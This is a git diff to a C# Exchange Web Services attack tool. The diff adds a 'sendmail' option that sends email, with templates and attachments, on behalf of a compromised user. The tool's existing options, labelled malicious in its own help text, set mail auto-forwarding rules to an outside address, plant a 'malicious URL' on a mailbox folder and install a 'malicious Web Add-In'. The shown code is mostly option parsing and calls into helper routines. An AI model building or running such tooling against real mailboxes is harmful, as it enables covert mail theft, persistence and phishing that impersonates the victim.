@@ -1,8 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using NDesk.Options;
-using Microsoft.Exchange.WebServices.Data;
 using System.Linq;
+using NDesk.Options;
+using System.Collections.Generic;
+using Microsoft.Exchange.WebServices.Data;
+
 
 namespace EWS
 {
@@ -37,6 +38,15 @@ namespace EWS
             List<string> bodyStrings = new List<string>();
             string forwardAddress = null;
 
+            // send mail
+            bool sendmail = false;
+            List<string> recipients = new List<string>();
+            string subject = null;
+            string template = null;
+            string format = null;
+            string attachement = null;
+            string from = null;
+
             // home folder
             bool homefolder = false;
             string url = null;
@@ -47,17 +57,29 @@ namespace EWS
 
             var options = new OptionSet()
             {
-                { "e|email=", "Email address to authenticate with", v => email = v },
-                { "p|password=", "Password to authenticate with", v => password = v },
+                // global 
+                { "E|Email=", "Email address to authenticate with", v => email = v },
+                { "P|Password=", "Password to authenticate with", v => password = v },
+                // rule
                 { "rule", "Set auto-forwarding rules on users' mailbox", v => rule = true },
-                { "n|name=", "Set a name for the rule", v => ruleName = v },
+                { "N|Name=", "Set a name for the rule", v => ruleName = v },
                 { "s|subject=", "Trigger on these strings in the mail Subject", v => subjectStrings = CreateList(v) },
                 { "b|body=", "Trigger on these strings in the mail Body", v => bodyStrings = CreateList(v) },
-                { "f|forward=", "Email address to receive forwarded emails at", v => forwardAddress = v },
+                { "F|Forward=", "Email address to receive forwarded emails at", v => forwardAddress = v },
+                // sendmail
+                { "sendmail", "Send an email an behalf of the current user", v => sendmail = true},
+                { "R|Recipients=", "Send email to", v => recipients = CreateList(v)},
+                { "S|Subject=", "Email subject", v => subject = v},
+                { "T|Template=", "Email template file", v => template = v},
+                { "t|plaintext", "Send email as plaintext, not HTML", v => format = "txt" },
+                { "a|attachment=", "Send an attachement", v => attachement = v },
+                { "f|from=", "Send email from this account / mailbox", v => from = v },
+                // homefolder
                 { "homefolder", "Set a malicious URL on a folder", v => homefolder = true },
-                { "u|url=", "URL to configure", v => url = v },
+                { "U|Url=", "URL to configure", v => url = v },
+                // installapp
                 { "installapp", "Install a malicious Web Add-In", v => installapp = true },
-                { "m|manifest=", "Manifest to install", v => manifest = v },
+                { "M|Manifest=", "Manifest to install", v => manifest = v },
                 { "h|?|help", "Show this help", v => help = true }
             };
 
@@ -77,6 +99,8 @@ namespace EWS
                 Console.WriteLine();
                 Console.WriteLine("  Options:");
                 options.WriteOptionDescriptions(Console.Out);
+                Console.WriteLine();
+                Console.WriteLine("  Uppercase parameters are mandatory for their respective functions.");
                 Console.WriteLine();
                 Help.ShowExamples();
                 return;
@@ -107,6 +131,20 @@ namespace EWS
 
                 ExchangeService service = Exchange.NewExchangeService(email, password);
                 Rules.AddNewRule(service, ruleName, subjectStrings, bodyStrings, forwardAddress);
+
+            }
+
+            if (sendmail)
+            {
+                if (!recipients.Any())
+                {
+                    Console.WriteLine();
+                    Console.WriteLine(" [x] Recipient email address(es) required");
+                    return;
+                }
+
+                ExchangeService service = Exchange.NewExchangeService(email, password);
+                Email.Send(service, recipients, subject, format, template, attachement, from);
 
             }
 
